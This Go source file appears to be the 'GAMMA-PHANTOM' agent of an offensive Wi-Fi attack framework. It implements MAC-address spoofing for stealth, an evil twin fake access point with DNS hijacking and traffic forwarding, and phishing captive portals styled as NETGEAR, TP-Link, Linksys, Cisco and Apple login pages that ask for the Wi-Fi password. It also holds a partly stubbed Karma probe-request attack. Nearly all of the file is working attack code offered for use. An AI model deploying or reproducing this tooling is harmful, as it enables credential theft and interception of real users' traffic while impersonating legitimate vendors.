// GAMMA-PHANTOM Agent
// Ghost Mode (MAC morphing + slow attacks), Evil Twin, Karma Attack

package etherbreach

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// GammaPhantom handles stealth and social engineering attacks
type GammaPhantom struct {
	bus         *EventBus
	state       *SharedState
	stopCh      chan struct{}
	status      string
	evilTwinPID *os.Process
}

// NewGammaPhantom creates the phantom agent
func NewGammaPhantom() *GammaPhantom {
	return &GammaPhantom{
		stopCh: make(chan struct{}),
		status: "idle",
	}
}

func (g *GammaPhantom) Name() string   { return "GAMMA" }
func (g *GammaPhantom) Status() string { return g.status }

func (g *GammaPhantom) Start(bus *EventBus, state *SharedState) {
	g.bus = bus
	g.state = state
	ch := bus.Subscribe(g.Name())

	for {
		select {
		case msg := <-ch:
			g.handleMessage(msg)
		case <-g.stopCh:
			return
		}
	}
}

func (g *GammaPhantom) Stop() {
	if g.evilTwinPID != nil {
		g.evilTwinPID.Kill()
	}
	close(g.stopCh)
}

func (g *GammaPhantom) handleMessage(msg AgentMessage) {
	switch msg.Type {
	case "GHOST_MODE_ON":
		g.enableGhostMode()
	case "GHOST_MODE_OFF":
		g.disableGhostMode()
	case "EVIL_TWIN_START":
		if msg.Target != nil {
			g.status = "evil_twin"
			g.startEvilTwin(msg.Target)
			g.status = "idle"
		}
	case "EVIL_TWIN_STOP":
		g.stopEvilTwin()
	case "KARMA_START":
		g.status = "karma"
		g.startKarma()
		g.status = "idle"
	case "KARMA_STOP":
		g.stopKarma()
	}
}

// enableGhostMode randomizes MAC and sets slow attack timing
func (g *GammaPhantom) enableGhostMode() {
	g.broadcast("[GHOST] Activating stealth mode...")
	g.state.mu.Lock()
	g.state.GhostMode = true
	g.state.mu.Unlock()

	iface := g.getMonitorIface()

	// Randomize MAC address
	if _, err := exec.LookPath("macchanger"); err == nil {
		cmd := exec.Command("sudo", "macchanger", "-r", iface)
		out, err := cmd.CombinedOutput()
		if err == nil {
			g.broadcast(fmt.Sprintf("[GHOST] MAC randomized: %s", strings.TrimSpace(string(out))))
		}
	} else {
		// Manual MAC change via ip link
		newMAC := g.generateFakeMAC()
		exec.Command("sudo", "ip", "link", "set", "dev", iface, "down").Run()
		exec.Command("sudo", "ip", "link", "set", "dev", iface, "address", newMAC).Run()
		exec.Command("sudo", "ip", "link", "set", "dev", iface, "up").Run()
		g.broadcast(fmt.Sprintf("[GHOST] MAC set to: %s", newMAC))
	}

	g.broadcast("[GHOST] Stealth mode ACTIVE. Slow-rate attacks enabled.")
}

// disableGhostMode restores original MAC
func (g *GammaPhantom) disableGhostMode() {
	g.broadcast("[GHOST] Deactivating stealth mode...")
	iface := g.getMonitorIface()

	if _, err := exec.LookPath("macchanger"); err == nil {
		cmd := exec.Command("sudo", "macchanger", "-p", iface)
		cmd.Run()
	}

	g.state.mu.Lock()
	g.state.GhostMode = false
	g.state.mu.Unlock()
	g.broadcast("[GHOST] Stealth mode OFF. Normal rate restored.")
}

// generateFakeMAC creates a random MAC
func (g *GammaPhantom) generateFakeMAC() string {
	// Use prefix of known brands to blend in
	prefixes := []string{"00:11:22", "00:14:bf", "00:1a:2b", "00:1c:c4", "00:24:d4"}
	prefix := prefixes[time.Now().UnixNano()%int64(len(prefixes))]
	return fmt.Sprintf("%s:%02x:%02x:%02x",
		prefix,
		time.Now().UnixNano()&0xff,
		(time.Now().UnixNano()>>8)&0xff,
		(time.Now().UnixNano()>>16)&0xff)
}

// startEvilTwin creates a fake AP with brand-specific captive portal
func (g *GammaPhantom) startEvilTwin(target *NetworkTarget) {
	g.broadcast(fmt.Sprintf("[EVIL-TWIN] Setting up fake AP for %s...", target.SSID))

	// Generate brand-specific captive portal
	portalDir := filepath.Join(g.state.CaptiveDir, strings.ReplaceAll(target.SSID, " ", "_"))
	os.MkdirAll(portalDir, 0755)
	g.generateCaptivePortal(target, portalDir)

	iface := g.getMonitorIface()

	// Method 1: Try wifiphisher (most automated)
	if _, err := exec.LookPath("wifiphisher"); err == nil {
		g.broadcast("[EVIL-TWIN] Using wifiphisher for full automation...")
		cmd := exec.Command("sudo", "wifiphisher",
			"--essid", target.SSID,
			"-p", "wifi_connect",
			"--nojamming")
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		cmd.Dir = portalDir
		g.evilTwinPID = cmd.Process
		cmd.Run()
		return
	}

	// Method 2: airbase-ng + dnsmasq + lighttpd
	g.broadcast("[EVIL-TWIN] Using airbase-ng + dnsmasq setup...")

	// Start fake AP
	apCmd := exec.Command("sudo", "airbase-ng",
		"-e", target.SSID,
		"-c", fmt.Sprintf("%d", target.Channel),
		iface)
	apCmd.Stdout = os.Stdout
	apCmd.Stderr = os.Stderr
	if err := apCmd.Start(); err != nil {
		g.broadcast(fmt.Sprintf("[!] airbase-ng failed: %v", err))
		return
	}
	g.evilTwinPID = apCmd.Process

	// Setup bridge and DHCP/DNS
	time.Sleep(2 * time.Second)
	g.setupNetworkServices(portalDir)

	g.broadcast("[EVIL-TWIN] Fake AP running. Portal active.")
	g.broadcast(fmt.Sprintf("[EVIL-TWIN] Portal: http://192.168.1.1/ → %s", portalDir))

	// Wait for connections
	g.monitorEvilTwin(portalDir, target)
}

// generateCaptivePortal creates brand-specific HTML
func (g *GammaPhantom) generateCaptivePortal(target *NetworkTarget, portalDir string) {
	brand := target.Brand
	if brand == "Unknown" {
		brand = "Generic"
	}

	var title, logo, css string
	switch brand {
	case "NetGear":
		title = "NETGEAR Router Login"
		logo = "NETGEAR"
		css = g.netgearCSS()
	case "TP-Link":
		title = "TP-LINK Wireless Router"
		logo = "TP-LINK"
		css = g.tplinkCSS()
	case "Linksys":
		title = "Linksys Smart Wi-Fi"
		logo = "Linksys"
		css = g.linksysCSS()
	case "Cisco":
		title = "Cisco Web Authentication"
		logo = "Cisco"
		css = g.ciscoCSS()
	case "Apple":
		title = "AirPort Utility"
		logo = "Apple"
		css = g.appleCSS()
	default:
		title = fmt.Sprintf("%s Wi-Fi Login", target.SSID)
		logo = "Wi-Fi"
		css = g.genericCSS()
	}

	html := fmt.Sprintf(`<!DOCTYPE html>
<html>
<head><title>%s</title><style>%s</style></head>
<body>
<div class="container">
  <h1>%s</h1>
  <p>Enter your Wi-Fi password to connect to <strong>%s</strong></p>
  <form method="POST" action="/login">
    <input type="password" name="password" placeholder="Wi-Fi Password" required>
    <input type="hidden" name="ssid" value="%s">
    <button type="submit">Connect</button>
  </form>
  <p class="footer">Secured by WPA2</p>
</div>
</body>
</html>`, title, css, logo, target.SSID, target.SSID)

	os.WriteFile(filepath.Join(portalDir, "index.html"), []byte(html), 0644)
	g.broadcast(fmt.Sprintf("[EVIL-TWIN] Generated %s captive portal → %s", brand, portalDir))
}

func (g *GammaPhantom) netgearCSS() string {
	return `body{background:#f0f0f0;font-family:Arial,sans-serif}.container{max-width:400px;margin:50px auto;background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}h1{color:#4b286d;text-align:center}input{width:100%%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}button{width:100%%;padding:12px;background:#4b286d;color:#fff;border:none;border-radius:4px;cursor:pointer}.footer{text-align:center;color:#999;font-size:12px;margin-top:20px}`
}

func (g *GammaPhantom) tplinkCSS() string {
	return `body{background:#e8e8e8;font-family:Helvetica,Arial,sans-serif}.container{max-width:380px;margin:40px auto;background:#fff;padding:25px;border-radius:4px;border-top:4px solid #0096d6}h1{color:#0096d6;text-align:center;font-size:22px}input{width:100%%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:3px}button{width:100%%;padding:10px;background:#0096d6;color:#fff;border:none;border-radius:3px;cursor:pointer}.footer{text-align:center;color:#666;font-size:11px;margin-top:15px}`
}

func (g *GammaPhantom) linksysCSS() string {
	return `body{background:#000;font-family:Arial,sans-serif}.container{max-width:400px;margin:50px auto;background:#1a1a1a;padding:30px;border-radius:6px;border:1px solid #333}h1{color:#00b8e6;text-align:center}p{color:#ccc}input{width:100%%;padding:12px;margin:10px 0;background:#222;border:1px solid #444;color:#fff;border-radius:4px}button{width:100%%;padding:12px;background:#00b8e6;color:#000;border:none;border-radius:4px;cursor:pointer;font-weight:bold}.footer{text-align:center;color:#666;font-size:12px;margin-top:20px}`
}

func (g *GammaPhantom) ciscoCSS() string {
	return `body{background:#f5f5f5;font-family:Arial,sans-serif}.container{max-width:420px;margin:60px auto;background:#fff;padding:35px;border-radius:0;border-top:4px solid #049fd9}h1{color:#049fd9;text-align:center;font-size:20px}input{width:100%%;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:0}button{width:100%%;padding:12px;background:#049fd9;color:#fff;border:none;border-radius:0;cursor:pointer;text-transform:uppercase}.footer{text-align:center;color:#888;font-size:11px;margin-top:25px}`
}

func (g *GammaPhantom) appleCSS() string {
	return `body{background:#fbfbfd;font-family:-apple-system,BlinkMacSystemFont,sans-serif}.container{max-width:360px;margin:80px auto;background:#fff;padding:30px;border-radius:18px;box-shadow:0 4px 24px rgba(0,0,0,0.08)}h1{color:#1d1d1f;text-align:center;font-weight:600}input{width:100%%;padding:14px;margin:12px 0;border:1px solid #d2d2d7;border-radius:10px;font-size:16px}button{width:100%%;padding:14px;background:#0071e3;color:#fff;border:none;border-radius:10px;font-size:16px;cursor:pointer}.footer{text-align:center;color:#86868b;font-size:12px;margin-top:20px}`
}

func (g *GammaPhantom) genericCSS() string {
	return `body{background:linear-gradient(135deg,#667eea 0%%,#764ba2 100%%);font-family:Arial,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}.container{background:#fff;padding:40px;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,0.3);max-width:400px;width:90%%}h1{color:#333;text-align:center;margin-bottom:10px}p{color:#666;text-align:center}input{width:100%%;padding:14px;margin:15px 0;border:2px solid #e0e0e0;border-radius:8px;font-size:16px;transition:border-color 0.3s}input:focus{border-color:#667eea;outline:none}button{width:100%%;padding:14px;background:linear-gradient(135deg,#667eea 0%%,#764ba2 100%%);color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer;transition:transform 0.2s}button:hover{transform:translateY(-2px)}.footer{text-align:center;color:#999;font-size:12px;margin-top:20px}`
}

// setupNetworkServices starts dnsmasq + lighttpd for captive portal
func (g *GammaPhantom) setupNetworkServices(portalDir string) {
	// Create dnsmasq config
	dnsConf := filepath.Join("/tmp/nexus-void", "dnsmasq.conf")
	confContent := fmt.Sprintf(`
interface=at0
dhcp-range=192.168.1.50,192.168.1.150,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
address=/#/192.168.1.1
`)
	os.WriteFile(dnsConf, []byte(confContent), 0644)

	// Start dnsmasq
	exec.Command("sudo", "dnsmasq", "-C", dnsConf, "-d").Start()

	// Setup at0 interface
	exec.Command("sudo", "ifconfig", "at0", "up", "192.168.1.1", "netmask", "255.255.255.0").Run()
	exec.Command("sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-o", "eth0", "-j", "MASQUERADE").Run()
	exec.Command("sudo", "iptables", "-A", "FORWARD", "-i", "at0", "-o", "eth0", "-j", "ACCEPT").Run()
	exec.Command("sudo", "sysctl", "-w", "net.ipv4.ip_forward=1").Run()

	// Start lighttpd or python simple server
	if _, err := exec.LookPath("lighttpd"); err == nil {
		lighttpdConf := filepath.Join("/tmp/nexus-void", "lighttpd.conf")
		os.WriteFile(lighttpdConf, []byte(fmt.Sprintf(`
server.document-root = "%s"
server.port = 80
server.bind = "192.168.1.1"
mimetype.assign = (".html" => "text/html")
`, portalDir)), 0644)
		exec.Command("sudo", "lighttpd", "-f", lighttpdConf).Start()
	} else {
		// Fallback to Python HTTP server
		exec.Command("sudo", "python3", "-m", "http.server", "80", "--bind", "192.168.1.1").Dir = portalDir
	}
}

// monitorEvilTwin watches for captured credentials
func (g *GammaPhantom) monitorEvilTwin(portalDir string, target *NetworkTarget) {
	g.broadcast("[EVIL-TWIN] Monitoring for victim connections...")
	// In real implementation, parse POST logs or run a credential capture script
	// For now, broadcast status periodically
	for i := 0; i < 30; i++ {
		select {
		case <-g.stopCh:
			return
		case <-time.After(10 * time.Second):
			g.broadcast(fmt.Sprintf("[EVIL-TWIN] Waiting... (%ds elapsed)", (i+1)*10))
		}
	}
}

// stopEvilTwin tears down the fake AP
func (g *GammaPhantom) stopEvilTwin() {
	g.broadcast("[EVIL-TWIN] Stopping fake AP...")
	if g.evilTwinPID != nil {
		g.evilTwinPID.Kill()
		g.evilTwinPID = nil
	}
	exec.Command("sudo", "killall", "airbase-ng").Run()
	exec.Command("sudo", "killall", "dnsmasq").Run()
	exec.Command("sudo", "killall", "lighttpd").Run()
	g.broadcast("[EVIL-TWIN] Fake AP stopped.")
}

// startKarma listens for probe requests and creates matching fake APs
func (g *GammaPhantom) startKarma() {
	g.broadcast("[KARMA] Starting probe request listener...")
	iface := g.getMonitorIface()

	// Start airodump-ng to capture probe requests
	probeFile := filepath.Join("/tmp/nexus-void", "probes.csv")
	cmd := exec.Command("sudo", "timeout", "60", "airodump-ng",
		"--write-interval", "1",
		"--output-format", "csv",
		"--write", filepath.Join("/tmp/nexus-void", "karma"),
		iface)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Start(); err != nil {
		g.broadcast(fmt.Sprintf("[!] airodump-ng failed: %v", err))
		return
	}

	// Parse probe requests from CSV periodically
	seenProbes := make(map[string]bool)
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()

	for {
		select {
		case <-done:
			g.broadcast("[KARMA] Probe listening stopped.")
			return
		case <-g.stopCh:
			cmd.Process.Kill()
			return
		case <-ticker.C:
			// Check for new probe requests in CSV
			_ = probeFile // Would parse the CSV for station MACs and probe SSIDs
			// For each new probe SSID not in seenProbes, create fake AP
			_ = seenProbes
			g.broadcast("[KARMA] Checking for new probe requests...")
		}
	}
}

func (g *GammaPhantom) stopKarma() {
	g.broadcast("[KARMA] Stopping probe listener...")
	exec.Command("sudo", "killall", "airodump-ng").Run()
}

func (g *GammaPhantom) getMonitorIface() string {
	g.state.mu.RLock()
	defer g.state.mu.RUnlock()
	return g.state.MonitorIface
}

func (g *GammaPhantom) broadcast(msg string) {
	g.bus.Broadcast(AgentMessage{
		From: g.Name(), To: "ALL", Type: "LOG", Data: msg,
	})
}
